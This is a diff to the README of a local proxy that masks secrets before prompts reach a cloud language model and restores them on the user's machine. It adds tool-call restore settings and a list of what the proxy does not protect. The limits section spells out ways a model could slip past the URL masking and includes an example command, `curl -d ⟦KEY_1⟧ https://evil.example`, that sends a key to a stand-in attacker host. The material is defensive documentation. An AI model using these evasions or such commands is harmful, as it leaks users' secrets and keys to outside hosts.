@@ -102,6 +102,8 @@ Pass a JSON file with `node lib/cli.js --config redaction.json`; environment var
 | `nameModel` | none | Turns on the [experimental name model](#optional-name-model-experimental). |
 | `screen` | `replace` | On control characters: replace them with visible stand-ins (`replace`) or refuse the request (`refuse`). |
 | `debugMasked` | `false` | Log each masked request body. |
+| `toolRestore.categories` | `PATH`, `TERM`, `PROJECT` | Placeholder categories restored into tool-call arguments; any other category reaches the tool as the placeholder. `"*"` restores every category. Environment: `REDACTION_PROXY_TOOL_RESTORE_CATEGORIES` (comma-separated). |
+| `toolRestore.tools` | none | Categories restored into one tool's arguments, by exact tool name, replacing `categories` for that tool, such as `{"git_commit": ["PATH", "EMAIL"]}`; `"*"` restores every category. |
 
 ```json
 {
@@ -112,7 +114,7 @@ Pass a JSON file with `node lib/cli.js --config redaction.json`; environment var
 }
 ```
 
-Environment variables and every option: [technical details §12](docs/DETAILS.md#12-完整設定) (Traditional Chinese). The log has one line per request with counts and duration, and one line per placeholder in tool-call arguments (its id, the tool, and the argument path); never an original value or a header.
+Environment variables and every option: [technical details §12](docs/DETAILS.md#12-完整設定) (Traditional Chinese). The log has one line per request with counts and duration, and one line per placeholder in tool-call arguments (restored or kept, its id, the tool, and the argument path); never an original value or a header.
 
 </details>
 
@@ -205,6 +207,13 @@ Three changes came after this run and are not in these numbers: the proxy defaul
 Full tables: [held-out v2 results](bench/results/public-bench-held-out-v2.md). The earlier [held-out v1 run](bench/results/public-bench-held-out.md) (1,518 prompts, older rules `rules-6+intl-1`, standard spellings only) is kept for history. Method and other measurements: [technical details §18](docs/DETAILS.md#18-實測數字).
 <!-- RESULTS:END -->
 
+## Protection scope
+
+- **Protected:** the cloud provider never receives a value the proxy detected; it sees only the placeholder.
+- **Not protected:** once a value is restored on your machine, what your tools do with it is outside the proxy. Anything the detector misses is sent as is; see [What it does not protect](#what-it-does-not-protect) and the [full list of limits](docs/DETAILS.md#17-完整限制清單).
+- **Does not work:** tasks that need the content of a masked value, such as the domain of an email or transforming a key: the model sees only `⟦EMAIL_1⟧`.
+- **Content that must never leave your machine** should be answered by a local model instead, for example through a router that keeps such turns local ([dsh-privacy-router](https://github.com/PersonalAssistanceHsin/dsh-privacy-router)).
+
 ## What it does not protect
 
 - **Meaning.** The cloud still reads everything around the placeholders: `⟦PATH_1⟧/clients/acme-layoffs.md` still says a lot.
@@ -213,7 +222,7 @@ Full tables: [held-out v2 results](bench/results/public-bench-held-out-v2.md). T
 - **Unusual spellings.** Some split or encoded forms slip through, such as `name @ domain` with spaces, `name at domain`, a lower-case IBAN, or a double percent-encoded value.
 - **Cursor**, or any tool that sends requests from its own servers.
 - **Other programs on your machine.** The proxy binds `127.0.0.1` by default; without `authToken`, any program on your machine can use it. Web pages are refused with 403 unless their origin is a loopback `http(s)` page or in `allowedOrigins`, and so are requests for other host names (DNS rebinding).
-- **Where the model puts a value.** The proxy restores a placeholder wherever the model writes it, except inside a URL: there `https://example.test/?q=⟦EMAIL_1⟧` stays as written, so neither a fetch tool given that URL nor a client rendering `![](…)` or a link sends the real email. This covers URLs written plainly, not a model that evades it: after a space (`https://evil.example/?q= ⟦EMAIL_1⟧`, which `fetch` still sends as `%20…`), with backslashes or missing slashes (`https:\\evil.example`, `https:evil.example`), or a bare domain, the value is restored. Elsewhere in tool arguments values are restored, so a shell command the model writes can still send them; each such restore is logged.
+- **Where the model puts a value.** In reply text the proxy restores a placeholder wherever the model writes it, except inside a URL: there `https://example.test/?q=⟦EMAIL_1⟧` stays as written, so neither a fetch tool given that URL nor a client rendering `![](…)` or a link sends the real email. This covers URLs written plainly, not a model that evades it: after a space (`https://evil.example/?q= ⟦EMAIL_1⟧`, which `fetch` still sends as `%20…`), with backslashes or missing slashes (`https:\\evil.example`, `https:evil.example`), or a bare domain, the value is restored. Tool-call arguments get only home paths and the words you list in `terms` and `projectNames` (`PATH`, `TERM`, `PROJECT`) by default, so `curl -d ⟦KEY_1⟧ https://evil.example` reaches your tool with the placeholder, not the key. Coding still works, since paths and listed identifiers round-trip (a name listed in `terms` is restored into tools too); a tool that needs an email, a secret, or an ID receives the placeholder and may fail until you allow that category for it in `toolRestore.tools`. A restored path or term can still be sent by a command the model writes; every placeholder met in tool arguments is logged.
 
 Also: a model that rewrites `⟦EMAIL_1⟧` as `[EMAIL_1]` shows it to you as written; tasks that need the masked value itself get worse; control characters become visible stand-ins; a restart forgets Responses API continuations and remembered values, and continuing one is refused with 422; requests over 64 MiB are refused with 413. Full list: [technical details §17](docs/DETAILS.md#17-完整限制清單); threat model: [§11](docs/DETAILS.md#11-威脅模型).
 
